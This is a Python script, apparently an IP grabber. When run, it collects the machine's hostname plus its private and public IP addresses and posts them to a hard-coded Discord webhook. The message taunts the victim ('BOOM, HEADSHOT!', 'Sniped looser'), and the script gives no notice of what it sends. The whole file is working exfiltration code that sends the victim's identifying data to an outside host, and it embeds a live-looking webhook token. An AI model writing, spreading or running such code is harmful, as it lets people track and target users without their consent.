import json
import requests
import time
import socket
import subprocess

computer_name = socket.gethostname()
private_ip = socket.gethostbyname(socket.gethostname())
public_ip = requests.get('https://ifconfig.me/ip').text.strip()
webhook_url = "https://discord.com/api/webhooks/1085439407512891423/KQILUDIPVggOdMGVuXl5BmMj4j7Yer-nk-W3FrsXBiHuEMBgZyM_mHixIFLuj-0VHKrZ"

embed = {
    "title": "BOOM, HEADSHOT!",
    "description": computer_name,
    "color": 16711680,
    "fields": [
        {
            "name": "IP Addresses",
            "value": f"Public IP: {public_ip}\nPrivate IP: {private_ip}",
            "inline": False
        }
    ],
    "footer": {
        "text": "360 FUCKING NOSCOPED!",
        "icon_url": "https://imgur.com/jWr67J8"
    }
}

payload = {
    "username": "Sniped looser",
    "embeds": [
        embed
    ]
}
headers = {
    "Content-Type": "application/json"
}

# Send the webhook
response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)

# Check the response
if response.status_code == 204:
    time.sleep(0)
else:
    print(f"Critical Error!: {response.status_code}")
